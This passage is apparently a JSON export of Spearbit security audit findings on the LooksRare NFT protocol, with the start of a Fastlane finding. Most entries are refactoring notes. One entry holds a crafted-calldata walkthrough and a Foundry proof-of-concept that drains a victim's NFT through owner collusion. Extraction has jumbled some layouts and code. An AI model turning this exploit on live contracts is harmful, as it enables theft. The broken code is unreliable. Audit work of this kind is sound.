        "body": "TransferManager has 3 endpoints that an approved operator can call:  transferItemsERC721  transferItemsERC1155  transferBatchItemsAcrossCollections The first 2 share the same input parameter types but differ from transferBatchItemsAcrossCollections: , address transferItemsERC1155 address ,! address[], address[], address, address , uint256[][], uint256[][] // ,! transferBatchItemsAcrossCollections , address, uint256[], uint256[] // transferItemsERC721, 44 An operator like LooksRareProtocol might have an owner ( OL ) that can select/add arbitrary endpoint of this transfer manager for an asset type, but only call the transfer manager using the same input parameter types regardless of the added endpoint. So in this case, OL might add a new asset type with TransferManager.transferBatchItemsAcrossCollections.selector as the selector and this transfer manager as the manager. Now, since this operator/LooksRareProtocol (and possibly other future implementations of approved operators) uses the same list of parameters for all endpoints, when _transferNFT gets called, the transfer manager using the transferBatchItemsAcrossCollections endpoint but with the following encoded data: the protocol would call abi.encodeWithSelector( managerSelectorOfAssetType[assetType].selector, collection, sender, recipient, itemIds, amounts ) ) A crafty OL might try to take advantage of the parameter type mismatch to create a malicious payload (address, address, address, uint256[], uint256[] ) that when decoded as (address[], address[], address, address, uint256[][], uint256[][]) It would allow them to transfer any NFT tokens from any user to some specific users. ; interpreted paramters | original parameter ,! ; ---------------------------------- ,! -------- c Ma.s or msg.sender 00000000000000000000000000000000000000000000000000000000000000c0 ; collections.ptr 0000000000000000000000000000000000000000000000000000000000000100 ; assetTypes.ptr ,! 00000000000000000000000000000000000000000000000000000000000000X3 ; from ,! 00000000000000000000000000000000000000000000000000000000000000X4 ; to ,! itemIds.ptr -> 0xa0 Tb.r or Mb.s x 0000000000000000000000000000000000000000000000000000000000000140 ; itemIds.ptr ,! amounts.ptr -> 0xc0 + 0x20 * itemIds.length 00000000000000000000000000000000000000000000000000000000000001c0 ; amounts.ptr ,! itemIds.length | collection | from / | to / | | | ; ; | itemIds[0] | itemIds[1] ... Fortunately, that is not possible since in this particular instance the transferItemsERC721 and transferItem- sERC1155's amounts's calldata tail pointer always coincide with transferBatchItemsAcrossCollections's itemIds's calldata tail pointer (uint256[] amounts, uint256[][] itemIds) which unless both have length 0 it would cause the compiled code to revert due to out of range index access. This is also dependent on if/how the compiler encodes/decodes the calldata and if the compiler would add the bytecodes for the deployed code to revert for OOR accesses (which solc does). This is just a lucky coincidence otherwise, OT could have exploited this flaw.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Shared login in different StrategyFloorFromChainlink strategies can be refactored",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": " executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategyWithTakerBid.  executeFixedDiscountCollectionOfferStrategyWithTakerAsk and executeBasisPointsDiscountCol- lectionOfferStrategyWithTakerAsk. Each group of endpoints in the above list share the exact same logic. The only difference they have is the formula and checks used to calculate the desiredPrice based on a given floorPrice and premium/discount. function a1(<INPUT_PARAMS>) external view returns (<OUTPUT_PARAMS>) { <PRE_COMMON_BLOCK> (<OUTER_PARAMS>) = _a1(<INTER_PARAMS>); // inlined computation of _a1 <POST_COMMON_BLOCK> } function a2(<INPUT_PARAMS>) external view returns (<OUTPUT_PARAMS>) { <PRE_COMMON_BLOCK> (<OUTER_PARAMS>) = _a2(<INTER_PARAMS>); // inlined computation of _a2 <POST_COMMON_BLOCK> }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Setting protocol and ask fee amounts and recipients can be refactored in ExecutionManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Setting and calculating the protocol and ask fee amounts and recipients follow the same logic in _executeStrategyForTakerAsk and _executeStrategyForTakerBid.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Creator fee amount and recipient calculation can be refactored in ExecutionManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The create fee amount and recipient calculation in _executeStrategyForTakerAsk and _executeS- trategyForTakerBid are identical and can be refactored.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "The owner can set the selector for a strategy to any bytes4 value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The owner can set the selector for a strategy to any bytes4 value (as long as it's not bytes4(0)). Even though the following check exists if (!IBaseStrategy(implementation).isLooksRareV2Strategy()) { revert NotV2Strategy(); } There is no measure taken to avoid potential selector collision with other contract types.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Constraints among the number of item ids and amounts for taker or maker bids or asks are incon- sistent among different strategies.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Constraints among the number of item ids and amounts for taker or maker bids or asks are incon- sistent among different strategies. notation description Ti Ta Mi Ma length of taker's bid (or ask depending on the context) item ids length of taker's bid (or ask depending on the context) amounts length of maker's bid (or ask depending on the context) item ids length of maker's bid (or ask depending on the context) amounts 59  IneheritedStategy : Ti = Ta = Mi = Ma  StrategyItemIdsRange : Ti (cid:20) Ta, Mi = 2, Ma = 1 (related issue)  StrategyDutchAuction : Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma  StrategyUSDDynamicAsk: Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid : Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma = 1  StrategyFloorFromChainlink.execute...DiscountCollectionOfferStrategyWithTakerAsk : Ti = 1, 1 = Ta, Ma = 1  StrategyCollectionOffer : Ti = 1, 1 (cid:20) Ta, Ma = 1 The equalities above are explicitly enforced, but the inequalities are implicitly enforced through the compiler's out-of-bound revert. Note that in most cases (except StrategyItemIdsRange) one can enforce Ti = Ta = Mi = Ma and refactor this logic into a utility function.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Requirements/checks for adding new transfer managers (or strategies) are really important to avoid self-reentrancy through restrictedExecuteTakerBid from unexpected call sites",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "When a new transfer manager gets added to the protocol, there is a check to make sure that this manager cannot be the protocol itself. This is really important as restrictedExecuteTakerBid allows the protocol itself to call this endpoint. If the check below was omitted: if ( transferManagerForAssetType == address(0) || // transferManagerForAssetType == address(this) || selectorForAssetType == bytes4(0) ) { } revert ManagerSelectorEmpty(); The owner can add the protocol itself as a transfer manager for a new asset type and pick the selector to be ILooksRareProtocol.restrictedExecuteTakerBid.selector. Then the owner along with a special address can collude and drain users' NFT tokens from an actual approved transfer manager for ERC721/ERC1155 assets. The special feature of restrictedExecuteTakerBid is that once it's called the provided parameters by the maker are not checked/verified against any signatures. The PoC below includes 2 different custom strategies for an easier setup but they are not necessary (one can use the default strategy). One creates the calldata payload and the other is called later on to select a desired NFT token id. 60 The calldata to restrictedExecuteTakerBid(...) is crafted so that the corresponding desired parameters for an actual transferManager.call can be set by itemIds; parameters offset ,! ------------------------------------------------------------------------------------------------------- c ,! 0x0000 interpreted parameters ---------- | original msg.sender, , can be changed by stuffing 0s 0000000000000000000000000000000000000000000000000000000000000080 0000000000000000000000000000000000000000000000000000000000000180 ,! 00000000000000000000000000000000000000000000000000000000000000X1 ; sender ,! 00000000000000000000000000000000000000000000000000000000000000a0 ,! msg.sender / signer ho, orderHash, 0xa0 | collection | signer / | Ta.r or | i[] ptr 0x0080 ,! to, can be changed by stuffing 0s 00000000000000000000000000000000000000000000000000000000000000X2 ; Tb.r | a[] ptr , 0x0180 00000000000000000000000000000000000000000000000000000000000000X3 ; Tb.p_max 00000000000000000000000000000000000000000000000000000000000000a0 00000000000000000000000000000000000000000000000000000000000000c0 00000000000000000000000000000000000000000000000000000000000000e0 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 from 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000X4 ; sid 00000000000000000000000000000000000000000000000000000000000000X5 ; t 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000X6 ; T 00000000000000000000000000000000000000000000000000000000000000X7 ; C 00000000000000000000000000000000000000000000000000000000000000X8 ; signer ,! 00000000000000000000000000000000000000000000000000000000000000X9 ; ts 00000000000000000000000000000000000000000000000000000000000000Xa ; te 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000001c0 00000000000000000000000000000000000000000000000000000000000001e0 0000000000000000000000000000000000000000000000000000000000000200 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 | i[].len | i[0] | i[1] | i[2] | i[3] | i[4] | i[5] | i[6] | i[7] | i[8] | i[9] | i[10] | i[11] | i[12] | i[13] , | i[14] | i[15] | i[16] | i[17] | i[18] | i[19] | i[20] | i[21] | i[22] ; T = real_collection ; C = currency ; t = assetType ; sid = strategyId ; ts = startTime ; te = endTime ; Ta = takerAsk ; Tb = takerBid // file: test/foundry/AssetAttack.t.sol pragma solidity 0.8.17; import {IStrategyManager} from \"../../contracts/interfaces/IStrategyManager.sol\"; import {IBaseStrategy} from \"../../contracts/interfaces/IBaseStrategy.sol\"; import {OrderStructs} from \"../../contracts/libraries/OrderStructs.sol\"; import {ProtocolBase} from \"./ProtocolBase.t.sol\"; import {MockERC20} from \"../mock/MockERC20.sol\"; 61 interface IERC1271 { function isValidSignature( bytes32 digest, bytes calldata signature ) external returns (bytes4 magicValue); } contract PayloadStrategy is IBaseStrategy { address private owner; address private collection; address private currency; uint256 private assetType; address private signer; uint256 private nextStartegyId; constructor() { owner = msg.sender; } function set( address _collection, address _currency, uint256 _assetType, address _signer, uint256 _nextStartegyId ) external { if(msg.sender != owner) revert(); collection = _collection; currency = _currency; assetType = _assetType; signer = _signer; nextStartegyId = _nextStartegyId; } function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function execute( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ ) external view returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) { itemIds = new uint256[](23); itemIds[0] = 0xa0; itemIds[1] = 0xc0; itemIds[2] = 0xe0; 62 itemIds[8] = nextStartegyId; itemIds[9] = assetType; itemIds[11] = uint256(uint160(collection)); itemIds[12] = uint256(uint160(currency)); itemIds[13] = uint256(uint160(signer)); itemIds[14] = 0; // startTime itemIds[15] = type(uint256).max; // endTime itemIds[17] = 0x01c0; itemIds[18] = 0x01e0; itemIds[19] = 0x0200; } } contract ItemSelectorStrategy is IBaseStrategy { address private owner; uint256 private itemId; uint256 private amount; constructor() { owner = msg.sender; } function set( uint256 _itemId, uint256 _amount ) external { if(msg.sender != owner) revert(); itemId = _itemId; amount = _amount; } function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function execute( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ external view returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) itemIds = new uint256[](1); itemIds[0] = itemId; amounts = new uint256[](1); amounts[0] = amount; ) { } } contract AttackTest is ProtocolBase { PayloadStrategy private payloadStrategy; 63 ItemSelectorStrategy private itemSelectorStrategy; MockERC20 private mockERC20; // // can be an arbitrary address uint256 private signingOwnerPK = 42; address private signingOwner = vm.addr(signingOwnerPK); // this address will define an offset in the calldata // and can be changed up to a certain upperbound by // stuffing calldata with 0s. address private specialUser1 = address(0x180); // NFT token recipient of the attack can also be changed // up to a certain upper bound by stuffing the calldata with 0s address private specialUser2 = address(0x3a0); // can be an arbitrary address address private victimUser = address(505); function setUp() public override { super.setUp(); vm.startPrank(_owner); { looksRareProtocol.initiateOwnershipTransfer(signingOwner); } vm.stopPrank(); vm.startPrank(signingOwner); { looksRareProtocol.confirmOwnershipTransfer(); mockERC20 = new MockERC20(); looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true); looksRareProtocol.updateCreatorFeeManager(address(0)); mockERC20.mint(victimUser, 1000); mockERC721.mint(victimUser, 1); // This particular strategy is not a requirement of the exploit. // it just makes it easier payloadStrategy = new PayloadStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, PayloadStrategy.execute.selector, true, address(payloadStrategy) ); itemSelectorStrategy = new ItemSelectorStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, ItemSelectorStrategy.execute.selector, false, address(itemSelectorStrategy) ); } 64 vm.stopPrank(); _setUpUser(victimUser); } function testAttack() public { vm.startPrank(signingOwner); looksRareProtocol.addTransferManagerForAssetType( 2, address(looksRareProtocol), looksRareProtocol.restrictedExecuteTakerBid.selector ); payloadStrategy.set( address(mockERC721), address(mockERC20), 0, victimUser, 2 // itemSelectorStrategy ID ); itemSelectorStrategy.set(1, 1); OrderStructs.MakerBid memory makerBid = _createSingleItemMakerBidOrder({ // payloadStrategy bidNonce: 0, subsetNonce: 0, strategyId: 1, assetType: 2, // LooksRareProtocol itself orderNonce: 0, collection: address(0x80), // calldata offset currency: address(mockERC20), signer: signingOwner, maxPrice: 0, itemId: 1 }); bytes memory signature = _signMakerBid(makerBid, signingOwnerPK); OrderStructs.TakerAsk memory takerAsk; vm.stopPrank(); vm.prank(specialUser1); looksRareProtocol.executeTakerAsk( takerAsk, makerBid, signature, _EMPTY_MERKLE_TREE, _EMPTY_AFFILIATE ); assertEq(mockERC721.balanceOf(victimUser), 0); assertEq(mockERC721.ownerOf(1), specialUser2); } }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "viewCreatorFeeInfo can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "viewCreatorFeeInfo includes a low-level staticcall to collection's royaltyInfo endpoint and later its return status is compared and the return data is decoded.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "_verifyMerkleProofOrOrderHash can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "_verifyMerkleProofOrOrderHash includes a if/else block that calls into _computeDigestAndVer- ify with almost the same inputs (only the hash is different).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "isOperatorValidForTransfer can be modified to refactor more of the logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "isOperatorValidForTransfer is only used to revert if necessary. The logic around the revert decision on all call sites.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Keep maximum allowed number of characters per line to 120.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There are a few long lines in the code base. contracts/executionStrategies/StrategyCollectionOffer.sol 21:2 27:2 29:2 30:2 67:2 69:2 70:2 118:2 119:2 error error error error error error error error error Line length must be no more than 120 but current length is 127 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length contracts/executionStrategies/StrategyDutchAuction.sol 20:2 22:2 23:2 26:5 70:31 85:2 86:2 92:5 error error error warning warning error error warning Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 9 but allowed no more than 7 Avoid to make time-based decisions in your business logic Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 8 but allowed no more than 7 max-line-length max-line-length max-line-length code-complexity not-rely-on-time max-line-length max-line-length code-complexity contracts/executionStrategies/StrategyItemIdsRange.sol 15:2 20:2 21:2 22:2 23:2 25:5 100:2 101:2 error error error error error warning error error Line length must be no more than 120 but current length is 142 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 12 but allowed no more than 7 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length code-complexity max-line-length max-line-length contracts/helpers/OrderValidatorV2A.sol 40:2 ,! 53:2 ,! error Line length must be no more than 120 but current length is 121 error Line length must be no more than 120 but current length is 121 max-line-length max-line-length 69 225:2 ,! 279:2 ,! 498:24 ,! 501:26 ,! 511:2 ,! 593:5 ,! 662:5 ,! 758:5 ,! 830:5 ,! 843:17 ,! 850:17 ,! 906:5 ,! 963:5 ,! 12:2 ,! 18:2 ,! 23:2 ,! 49:5 ,! 81:2 ,! 144:2 ,! error Line length must be no more than 120 but current length is 127 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Avoid to make time-based decisions in your business logic not-rely-on-time warning Avoid to make time-based decisions in your business logic not-rely-on-time error Line length must be no more than 120 but current length is 143 max-line-length warning Function has cyclomatic complexity 9 but allowed no more than 7 warning Function has cyclomatic complexity 9 but allowed no more than 7 code-complexity code-complexity warning Function order is incorrect, internal view function can not go after internal pure function (line 727) ordering warning Function has cyclomatic complexity 10 but allowed no more than 7 code-complexity warning Avoid to use inline assembly. It is acceptable only in rare cases no-inline-assembly warning Avoid to use inline assembly. It is acceptable only in rare cases warning Function has cyclomatic complexity 8 but allowed no more than 7 no-inline-assembly code-complexity warning Function has cyclomatic complexity 8 but allowed no more than 7 code-complexity contracts/helpers/ValidationCodeConstants.sol 17:2 18:2 error error Line length must be no more than 120 but current length is 129 Line length must be no more than 120 but current length is 121 max-line-length max-line-length contracts/interfaces/ILooksRareProtocol.sol 160:2 error Line length must be no more than 120 but current length is 122 max-line-length contracts/libraries/OrderStructs.sol error Line length must be no more than 120 but current length is 292 error Line length must be no more than 120 but current length is 292 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length max-line-length warning Function order is incorrect, struct definition can not go after state variable declaration (line 26) ordering error Line length must be no more than 120 but current length is 128 max-line-length error Line length must be no more than 120 but current length is 131 max-line-length 49 problems (34 errors, 15 warnings)",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "avoid transferring in _transferFungibleTokens when sender and recipient are equal",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Currently, there is no check in _transferFungibleTokens to avoid transferring funds from sender to recipient when they are equal. There is only one check outside of _transferFungibleTokens when one wants to transfer to an affiliate. But if the bidUser is the creator, or the ask recipient or the protocolFeeRecipient, the check is missing.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Keep the order of parameters consistent in updateStrategy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In updateStrategy, isActive is set first when updating storage, and it's the second parameter when supplied to the StrategyUpdated event. But it is the last parameter supplied to updateStrategy.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "_transferFungibleTokens does not check whether the amount is 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "_transferFungibleTokens does not check whether amount is 0 to skip transferring to recipient. For the ask recipient and creator amounts the check is performed just before calling this function. But the check is missing for the affiliate and protocol fees.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "StrategyItemIdsRange.executeStrategyWithTakerAsk - Maker's bid amount might be entirely ful- filled by a single ERC1155 item",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "StrategyItemIdsRange allows a buyer to specify a range of potential item ids (both ERC721 and ERC1155) and a desired amount, then a seller can match the buyer's request by picking a subset of items from the provided range so that the desired amount of items are eventually fulfilled. a taker might pick a single ERC1155 item id from the range and fulfill the entire order with multiple instances of that same item.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define named constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": " ExecutionManager.sol#L289 : 0x7476320f is cast sig \"OutsideOfTimeRange()\"  TransferSelectorNFT.sol#L30 : 0xa7bc96d3 is cast sig \"transferItemsERC721(address,address,address,uint256[],uint256[])\" and can be replaced by TransferManager.transferItemsERC721.selector  TransferSelectorNFT.sol#L31 : 0xa0a406c6 is cast sig \"transferItemsERC1155(address,address,address,uint256[],uint256[])\" and can be replaced by TransferManager.transferItemsERC1155.selector.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "price validation in executeStrategyWithTakerAsk, executeCollectionStrategyWithTakerAsk and executeCollectionStrategyWithTakerAskWithProof can be relaxed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the above context, a maker is bidding a maximum price pmax and a taker is asking a minimum price pmin, the strategy should calculate a price p in the range [pmin, pmax ] and so we would need to have pmin (cid:20) pmax . The above strategies pick the execution price to be pmax (the maximum price bid by the maker), and since the taker is the caller to the protocol we would only need to require pmin (cid:20) pmax . But the current requirement is pmin = pmax . if ( ... || makerBid.maxPrice != takerAsk.minPrice) { revert OrderInvalid(); }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Change occurances of whitelist to allowlist and blacklist to blocklist",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the codebase, whitelist (blacklist) is used to represent entities or objects that are allowed (denied) to be used or perform certain tasks. This word is not so accurate/suggestive and also can be offensive.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add more documentation on expected priceFeed decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The Chainlink strategies are making the following assumptions 1. All priceFeeds in StrategyFloorFromChainlink have a decimals value of 18. 2. The priceFeed in StrategyUSDDynamicAsk has a decimals value of 8. Any priceFeed that is added that does not match these assumptions would lead to incorrect calculations.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code duplicates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "* In some places, Chainlink staleness is checked using block.timestamp - updatedAt > maxLa- tency, and in other places it is checked using block.timestamp > maxLatency + updatedAt. Consider refactor- ing this code into a helper function. Otherwise, it would be better to use only one version of the two code snippets across the protocol.  The validation check to match assetType with the actual amount of items being transferred is duplicated among the different strategies instead of being implemented at a higher level once, such as in a common function or class that can be reused among the different strategies.  _executeStrategyForTakerAsk and _executeStrategyForTakerBid almost share the same code.  TakerBid, TakerAsk can be merged into a single struct.  MakerBid, MakerAsk can be merged into a single struct.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Low level calls are not recommended as they lack type safety and won't revert for calls to EOAs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Low-level calls are not recommended for interaction between different smart contracts in modern versions of the compiler, mainly because they lack type safety, return data size checks, and won't revert for calls to Externally Owned Accounts.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Insufficient input validation of orders (especially on the Taker's side)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There is a lack of consistency in the validation of parameters, as some fields of the taker's order are checked against the maker's order while others are not. It is worth noting that we have not identified any significant impact caused by this issue.  Missing validation of strategyId  Missing validation of collection  Most strategies only validate length mismatches on one side of the order. Also, they don't usually validate that the lengths match between both sides. For example, in the DutchAuction strategy, if the makerAsk has itemIds and amounts arrays of length 2 and 2, then it would be perfectly valid for the takerBid to use itemIds and amounts arrays of length 5 and 7, as long as the first two elements of both arrays match what is expected. (FYI: I filed a related issue for the ItemIdsRange strategy, which I think is more severe of an issue because the mismatched lengths can actually be returned from the function).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "LooksRareProtocol's owner can take maker's tokens for signed orders with unimplemented strat- egyIds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "If a maker signs an order that uses a strategyId that hasn't been added to the protocol yet, the protocol owner can add a malicious strategy afterward such that a taker would be able to provide no fulfillment but take all the offers.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Strategies with faulty price feeds can have unwanted consequences",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In LooksRare protocol once a strategy has been added its implementation and selector cannot be updated. This is a good since users who sign their MakerBid or MakerAsk can trustlessly examine the strategy implementation before including them into their orders. Some strategies might depend on other actors such as price feeds. This is the case for StrategyUSDDynamicAsk and StrategyFloorFromChainlink. If for some reason these price feeds do not return the correct prices, these strategies can have a slight deviation from their original intent. Case StrategyUSDDynamicAsk If the price feed returns a lower price, a taker can bid on an order with that lower price. This scenario is guarded by MakerAsk's minimum price. But the maker would not receive the expected amount if the correct price was reported and was greater than the maker's minimum ask. Case StrategyFloorFromChainlink For executeFixedDiscountCollectionOfferStrategyWithTakerAsk and executeBasisPointsDiscountCollec- tionOfferStrategyWithTakerAsk if the price feeds reports a floor price higher than the maker's maximum bid price, the taker can match with the maximum bid. Thus the maker ends up paying more than the actual floor adjusted by the discount formula. For executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategyWithTakerBid if the price feeds report a floor price lower than the maker's minimum ask price, the taker can match with the minimum ask price and pay less than the actual floor price (adjusted by the premium).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "The provided price to IERC2981.royaltyInfo does not match the specifications",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "royaltyFeeRegistry.royaltyInfo does not return a non-zero creator address, we check whether the collection supports IERC2981 and if it does, we loop over each itemId and call the collection's royaltyInfo endpoint. But the input price parameters provided to this endpoint do not match the specification of EIP-2981: CreatorFeeManagerWithRoyalties, CreatorFeeManagerWithRebates and /// @param _salePrice - the sale price of the NFT asset specified by _tokenId 78 The price provided in viewCreatorFeeInfo functions, is the price for the whole batch of itemIds and not the individual tokens itemIds[i] provided to the royaltyInfo endpoint. Even if the return values (newCreator, newCreatorFee) would all match, it would not mean that newCreatorFee should be used as the royalty for the whole batch. An example is that if the royalty is not percentage-based, but a fixed price.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Replace the abi.encodeWithSelector with abi.encodeCall to ensure type and typo safety",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the context above, abi.encodeWithSelector is used to create the call data for a call to an external contract. This function does not guarantee that mismatched types are used for the input parameters.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use the inline keccak256 with the formatting suggested when defining a named constant for an EIP-712 type hash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Hardcoded byte32 EIP-712 type hashes are defined in the OrderStructs library.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Calculations in solverMetaTryCatch() non consistent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The calculations in solverMetaTryCatch() non consistent. The drawings below show the different situations.  startBalance and endBalance calculations The tables below show remarks concerning the startBalance and endBalance calculations. | ETH start- invertsBidValue | invertsBidValue| | ------------ | ----------------------| ------- | | Balance and endBalance | ! bidFind==true | endBalance includes solverOp.value and initial balance so compare to bidAmount isn't ok | startBalance == 0 so this fails: netBid = startBalance - endBalance | | bidFind==false | endBal- ance includes solverOp.value and initial balance so compare to bidAmount isn't ok| startBalance == 0 so this fails: startBalance - endBalance | ERC20startBalance and end- Balance ! invertsBidValue invertsBidValue bidFind==true bidFind==false Seems ok Seems ok Assumes sufficient ERC20 in EE Assumes sufficient ERC20 in EE No allowance to solver 7 When invertsBidValue == false, the endBalance is used, which includes the solverOp.value and the initial ETH balance. This is compared to bidAmount but that doesn't seem right. The startBalance for ETH is set to 0 which leads to reverts when invertsBidValue == true, because the code tries to subtract from 0.  (ExtraEth)EndBalance calculations Variable endBalance is reused for a second 